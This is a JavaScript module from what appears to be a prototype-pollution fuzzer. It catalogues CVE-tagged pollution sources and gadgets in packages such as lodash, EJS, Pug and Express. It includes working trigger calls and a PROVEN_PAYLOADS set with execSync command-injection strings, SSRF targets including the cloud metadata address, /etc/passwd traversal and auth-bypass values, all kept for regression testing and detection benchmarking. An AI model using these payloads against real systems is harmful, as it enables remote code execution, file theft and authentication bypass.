/**
 * Known Prototype Pollution Gadget Database
 *
 * Comprehensive catalog of every publicly documented prototype pollution
 * vulnerability — both PP sources (merge bugs) and PP gadgets (property
 * reads that reach dangerous sinks).
 *
 * Sources:
 * - NVD CWE-1321 entries (2018–2025)
 * - Snyk Vulnerability Database
 * - GitHub Advisory Database (GHSA)
 * - Shcherbakov et al., "Silent Spring", USENIX Security 2023
 * - PortSwigger Research (server-side PP in Node.js)
 * - HackerOne disclosed reports
 *
 * Each entry includes:
 * - Package name and affected version range
 * - CVE/GHSA identifier
 * - Polluted property name(s) and payload
 * - Sink type (eval, Function, exec, innerHTML, etc.)
 * - Attack impact (RCE, XSS, DoS, auth bypass)
 * - Classification: 'source' (merge bug) or 'gadget' (property→sink)
 *
 * Used for:
 * 1. Regression testing — verify UoPFuzz detects known vulns
 * 2. Property seeding — feed known-working property names to the fuzzer
 * 3. Payload seeding — use proven payload patterns
 * 4. Benchmark scoring — measure detection rate against ground truth
 */

import { packageBaseName } from '../utils/package-name.js';

// ─── PP SOURCES (merge/extend functions that pollute Object.prototype) ────────

export const PP_SOURCES = [
  // lodash — the canonical PP source
  {
    package: 'lodash',
    versions: '<4.17.12',
    cve: 'CVE-2019-10744',
    function: 'defaultsDeep',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "_.defaultsDeep({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  {
    package: 'lodash',
    versions: '<4.17.5',
    cve: 'CVE-2018-3721',
    function: 'merge',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "_.merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  {
    package: 'lodash',
    versions: '<4.17.17',
    cve: 'CVE-2020-8203',
    function: 'zipObjectDeep',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "_.zipObjectDeep(['__proto__.polluted'], [true])",
    impact: 'RCE',
    class: 'source',
  },
  // jQuery — deep extend
  {
    package: 'jquery',
    versions: '<3.4.0',
    cve: 'CVE-2019-11358',
    function: 'extend',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "$.extend(true, {}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'XSS',
    class: 'source',
  },
  // minimist — the classic
  {
    package: 'minimist',
    versions: '<1.2.6',
    cve: 'CVE-2021-44906',
    function: 'parse',
    payload: { type: 'argv', property: 'polluted', value: true },
    callingConvention: "minimist(['--__proto__.polluted', 'true'])",
    impact: 'RCE',
    class: 'source',
  },
  {
    package: 'minimist',
    versions: '<0.2.4',
    cve: 'CVE-2020-7598',
    function: 'parse',
    payload: { type: 'argv', property: 'polluted', value: true },
    callingConvention: "minimist(['--__proto__.polluted', 'true'])",
    impact: 'RCE',
    class: 'source',
  },
  // qs — query string parser
  {
    package: 'qs',
    versions: '<6.3.3',
    cve: 'CVE-2017-1000048',
    function: 'parse',
    payload: { type: 'querystring', property: 'polluted', value: true },
    callingConvention: "qs.parse('__proto__[polluted]=true')",
    impact: 'RCE',
    class: 'source',
  },
  // hoek (Hapi ecosystem)
  {
    package: 'hoek',
    versions: '<5.0.3',
    cve: 'CVE-2018-3728',
    function: 'merge',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "Hoek.merge({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  // deep-extend
  {
    package: 'deep-extend',
    versions: '<0.5.1',
    cve: 'CVE-2018-3750',
    function: 'default',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "deepExtend({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  // merge-deep
  {
    package: 'merge-deep',
    versions: '<3.0.3',
    cve: 'CVE-2021-23397',
    function: 'default',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "mergeDeep({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  // defaults-deep
  {
    package: 'defaults-deep',
    versions: '<0.2.4',
    cve: 'CVE-2019-10793',
    function: 'default',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "defaultsDeep({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  // mixin-deep
  {
    package: 'mixin-deep',
    versions: '<2.0.1',
    cve: 'CVE-2019-10746',
    function: 'default',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "mixinDeep({}, JSON.parse('{\"__proto__\":{\"polluted\":true}}'))",
    impact: 'RCE',
    class: 'source',
  },
  // set-value
  {
    package: 'set-value',
    versions: '<4.0.1',
    cve: 'CVE-2021-23440',
    function: 'default',
    payload: { type: 'path', property: 'polluted', value: true },
    callingConvention: "setValue({}, '__proto__.polluted', true)",
    impact: 'RCE',
    class: 'source',
  },
  // flat
  {
    package: 'flat',
    versions: '<5.0.1',
    cve: 'CVE-2020-36632',
    function: 'unflatten',
    payload: { type: 'path', property: 'polluted', value: true },
    callingConvention: "flat.unflatten({'__proto__.polluted': true})",
    impact: 'RCE',
    class: 'source',
  },
  // dot-prop
  {
    package: 'dot-prop',
    versions: '<5.1.1',
    cve: 'CVE-2020-8116',
    function: 'set',
    payload: { type: 'path', property: 'polluted', value: true },
    callingConvention: "dotProp.set({}, '__proto__.polluted', true)",
    impact: 'RCE',
    class: 'source',
  },
  // class-transformer
  {
    package: 'class-transformer',
    versions: '<0.3.1',
    cve: 'CVE-2022-21681',
    function: 'plainToClass',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "plainToClass(SomeClass, {'__proto__': {'polluted': true}})",
    impact: 'RCE',
    class: 'source',
  },
  // json5
  {
    package: 'json5',
    versions: '<2.2.2',
    cve: 'CVE-2022-46175',
    function: 'parse',
    payload: { type: '__proto__', property: 'polluted', value: true },
    callingConvention: "JSON5.parse('{\"__proto__\":{\"polluted\":true}}')",
    impact: 'RCE',
    class: 'source',
  },
];

// ─── PP GADGETS (property reads that reach dangerous sinks) ───────────────────

export const PP_GADGETS = [
  // Pug — compileDebug enables code injection
  {
    package: 'pug',
    versions: '<3.0.1',
    cve: 'CVE-2021-21353',
    property: 'compileDebug',
    payload: true,
    sink: 'eval',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'Setting compileDebug=true causes pug to emit debug code with attacker-controlled template strings',
  },
  {
    package: 'pug',
    versions: '<3.0.1',
    property: 'block',
    payload: { type: 'jade_block' },
    sink: 'Function',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'Polluting block property injects into compiled template function body',
  },
  {
    package: 'pug',
    versions: '<3.0.1',
    property: 'self',
    payload: true,
    sink: 'eval',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'self=true changes variable scoping in compiled template, enabling injection',
  },
  // Squirrelly — CVE-2021-32819
  {
    package: 'squirrelly',
    versions: '<9.0.0',
    cve: 'CVE-2021-32819',
    property: 'defaultFilter',
    payload: "e'}}); process.mainModule.require('child_process').execSync('id');//",
    sink: 'Function',
    entryPoint: 'render',
    impact: 'RCE',
    class: 'gadget',
    description: 'defaultFilter is used in Function() constructor — injection via string concatenation',
  },
  // EJS — outputFunctionName
  {
    package: 'ejs',
    versions: '<3.1.7',
    cve: 'CVE-2022-29078',
    property: 'outputFunctionName',
    payload: "x;process.mainModule.require('child_process').execSync('id');//",
    sink: 'Function',
    entryPoint: 'render',
    impact: 'RCE',
    class: 'gadget',
    description: 'outputFunctionName injected directly into Function() body during template compilation',
  },
  {
    package: 'ejs',
    versions: '<3.1.7',
    cve: 'CVE-2022-29078',
    property: 'destructuredLocals',
    payload: ["x;process.mainModule.require('child_process').execSync('id');//"],
    sink: 'Function',
    entryPoint: 'render',
    impact: 'RCE',
    class: 'gadget',
    description: 'destructuredLocals array elements injected into Function body',
  },
  {
    package: 'ejs',
    versions: '<3.1.7',
    cve: 'CVE-2022-29078',
    property: 'client',
    payload: true,
    sink: 'Function',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'client=true changes template compilation path to emit exploitable code',
  },
  {
    package: 'ejs',
    versions: '<3.1.7',
    cve: 'CVE-2022-29078',
    property: 'escapeFunction',
    payload: "1;return process.mainModule.require('child_process').execSync('id').toString()//",
    sink: 'Function',
    entryPoint: 'render',
    impact: 'RCE',
    class: 'gadget',
    description: 'escapeFunction value injected into compiled template function',
  },
  // Handlebars — CVE-2021-23369
  {
    package: 'handlebars',
    versions: '<4.7.7',
    cve: 'CVE-2021-23369',
    property: 'constructor',
    payload: { prototype: { toString: function() { return "constructor.constructor('return process')()"; } } },
    sink: 'Function',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'Prototype pollution via constructor chain reaches template compilation',
  },
  // Hogan.js (Twitter)
  {
    package: 'hogan.js',
    versions: '*',
    property: 'indent',
    payload: "');process.mainModule.require('child_process').execSync('id');//",
    sink: 'Function',
    entryPoint: 'compile',
    impact: 'RCE',
    class: 'gadget',
    description: 'indent property injected into compiled template string',
  },
  // Nunjucks
  {
    package: 'nunjucks',
    versions: '<3.2.4',
    property: 'autoescape',
    payload: false,
    sink: 'eval',
    entryPoint: 'renderString',
    impact: 'XSS',
    class: 'gadget',
    description: 'Disabling autoescape via pollution allows XSS in template output',
  },
  // Express — Silent Spring research
  {
    package: 'express',
    versions: '*',
    property: 'layout',
    payload: '../../../../etc/passwd',
    sink: 'fs.readFile',
    entryPoint: 'render',
    impact: 'LFI',
    class: 'gadget',
    description: 'layout property controls template path — path traversal via pollution',
  },
  {
    package: 'express',
    versions: '*',
    property: 'view',
    payload: null,
    sink: 'behavioral_change',
    entryPoint: 'render',
    impact: 'DoS',
    class: 'gadget',
    description: 'Polluting view to null crashes the render pipeline',
  },
  // Mongoose/MongoDB — NoSQL injection via PP
  {
    package: 'mongoose',
    versions: '*',
    property: '$gt',
    payload: '',
    sink: 'mongo_query',
    entryPoint: 'find',
    impact: 'auth_bypass',
    class: 'gadget',
    description: 'Polluting $gt on Object.prototype causes all MongoDB queries to match all documents',
  },
  // Node.js core — child_process.spawn shell option
  {
    package: 'node',
    versions: '*',
    property: 'shell',
    payload: true,
    sink: 'child_process.spawn',
    entryPoint: 'spawn',
    impact: 'RCE',
    class: 'gadget',
    description: 'Polluting shell=true causes spawn() to run args through /bin/sh — command injection',
  },
  {
    package: 'node',
    versions: '*',
    property: 'env',
    payload: { NODE_OPTIONS: '--require ./malicious.js' },
    sink: 'child_process.fork',
    entryPoint: 'fork',
    impact: 'RCE',
    class: 'gadget',
    description: 'Polluting env.NODE_OPTIONS injects --require into forked processes',
  },
  // got HTTP client
  {
    package: 'got',
    versions: '<12.0.0',
    property: 'method',
    payload: 'PUT',
    sink: 'http.request',
    entryPoint: 'default',
    impact: 'SSRF',
    class: 'gadget',
    description: 'Polluting method changes HTTP method of all requests',
  },
];

// ─── KNOWN-DANGEROUS PROPERTY NAMES (union of all gadgets above + research) ──

export const KNOWN_GADGET_PROPERTIES = [
  // From CVE database (proven exploitable)
  'compileDebug', 'block', 'self', 'defaultFilter', 'outputFunctionName',
  'destructuredLocals', 'client', 'escapeFunction', 'indent',
  'autoescape', 'layout', 'view', 'shell', 'env',
  // From Silent Spring (USENIX '23) — server-side Node.js gadgets
  'argv0', 'execArgv', 'execPath', 'NODE_OPTIONS',
  'mainModule', 'require', '_compile', 'filename', 'paths',
  // From PortSwigger research — status override, JSON spaces
  'status', 'statusCode', 'type', 'body', 'json spaces',
  'content-type', 'x-forwarded-for', 'x-forwarded-host',
  // From Snyk research — config pollution
  'allowDots', 'allowPrototypes', 'charset', 'parameterLimit',
  'strictNullHandling', 'ignoreQueryPrefix', 'delimiter',
  // Boolean gates — commonly check Object.prototype for config flags
  'debug', 'verbose', 'production', 'development', 'cache',
  'strict', 'unsafe', 'raw', 'async', 'sync',
  // Template engine properties (comprehensive)
  'template', 'source', 'code', 'compile', 'render', 'eval',
  'globals', 'filters', 'plugins', 'pretty', 'doctype', 'basedir',
  'localsName', 'rmWhitespace', 'root', 'views', 'partials',
  'helpers', 'data', 'extensions', 'tags',
  // URL/Network sinks
  'url', 'href', 'src', 'action', 'formAction', 'baseURL',
  'proxy', 'agent', 'hostname', 'host', 'port', 'protocol',
  'method', 'headers', 'auth', 'timeout',
  // DOM sinks
  'innerHTML', 'outerHTML', 'textContent', 'onclick', 'onerror',
  'srcdoc', 'sandbox',
  // Process/Shell sinks
  'command', 'cmd', 'script', 'cwd', 'encoding', 'stdio',
  'argv', 'args', 'execPath', 'shell',
  // Object mechanics that enable exploitation
  'constructor', 'toString', 'valueOf', 'toJSON', 'then',
  'hasOwnProperty', 'isPrototypeOf',
  // Merge/clone behavior modifiers (affect whether pollution propagates)
  'clone', 'deep', 'recursive', 'overwrite', 'isMergeableObject',
  'customMerge', 'arrayMerge', 'cloneNode', 'nodeType', 'ownerDocument',
  // Serialization
  'reviver', 'replacer', 'parser', 'serializer', 'decoder', 'space',
  // Auth/ACL bypass
  'isAdmin', 'isAuthenticated', 'role', 'permissions', 'admin',
  'token', 'secret', 'password', 'apiKey',
];

// ─── PAYLOAD PATTERNS (proven to achieve code execution) ──────────────────────

export const PROVEN_PAYLOADS = {
  // RCE via Function constructor
  rce_function: "x]});process.mainModule.require('child_process').execSync('id');//",
  rce_require: "require('child_process').execSync('id')",
  rce_constructor: 'constructor.constructor("return this")().process.mainModule.require("child_process").execSync("id")',

  // Template engine specific
  ejs_outputFn: "x;process.mainModule.require('child_process').execSync('id');//",
  pug_code: "-var x = process.mainModule.require('child_process').execSync('id')",
  squirrelly_filter: "e'}}); process.mainModule.require('child_process').execSync('id');//",
  hogan_indent: "');process.mainModule.require('child_process').execSync('id');//",
  handlebars_constructor: "constructor.constructor('return process')()",

  // SSRF
  ssrf_metadata: 'http://169.254.169.254/latest/meta-data/',
  ssrf_internal: 'http://127.0.0.1:6379/',  // Redis
  ssrf_file: 'file:///etc/passwd',

  // Path traversal
  lfi_etc_passwd: '../../../../../../etc/passwd',
  lfi_env: '../../../../../../proc/self/environ',

  // Auth bypass
  auth_bypass_true: true,
  auth_bypass_admin: 'admin',

  // DoS
  dos_null: null,
  dos_huge_array: new Array(1000000).fill('x'),
  dos_regex: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaab',
};

/**
 * Get all known-dangerous property names from the gadget database.
 * Used to seed the fuzzer's property list with proven-exploitable names.
 */
export function getKnownProperties() {
  const props = new Set(KNOWN_GADGET_PROPERTIES);
  for (const g of PP_GADGETS) {
    if (g.property) props.add(g.property);
  }
  for (const s of PP_SOURCES) {
    if (s.payload?.property) props.add(s.payload.property);
  }
  return [...props];
}

/**
 * Get all known PP source functions.
 * Used to prioritize entry points during auto-discovery.
 */
export function getKnownSourceFunctions() {
  return [...new Set(PP_SOURCES.map(s => s.function))];
}

/**
 * Look up known gadgets for a specific package.
 * @param {string} packageName
 * @returns {Array} Known gadgets and sources for this package
 */
export function getGadgetsForPackage(packageName) {
  const base = packageBaseName(packageName);
  return [
    ...PP_SOURCES.filter(s => s.package === base),
    ...PP_GADGETS.filter(g => g.package === base),
  ];
}

/**
 * Benchmark: check which known gadgets the fuzzer detected.
 * @param {Array} confirmedChains - Chains confirmed by differential oracle
 * @param {string} packageName
 * @returns {{ detected: Array, missed: Array, detectionRate: number }}
 */
export function benchmarkDetection(confirmedChains, packageName) {
  const known = getGadgetsForPackage(packageName);
  if (known.length === 0) return { detected: [], missed: [], detectionRate: 1.0 };

  const detected = [];
  const missed = [];

  for (const gadget of known) {
    const prop = gadget.property || gadget.payload?.property;
    const found = confirmedChains.some(chain =>
      chain.source?.property === prop ||
      chain.differential?.pollutedProperties?.includes(prop)
    );

    if (found) {
      detected.push(gadget);
    } else {
      missed.push(gadget);
    }
  }

  return {
    detected,
    missed,
    detectionRate: known.length > 0 ? detected.length / known.length : 1.0,
  };
}
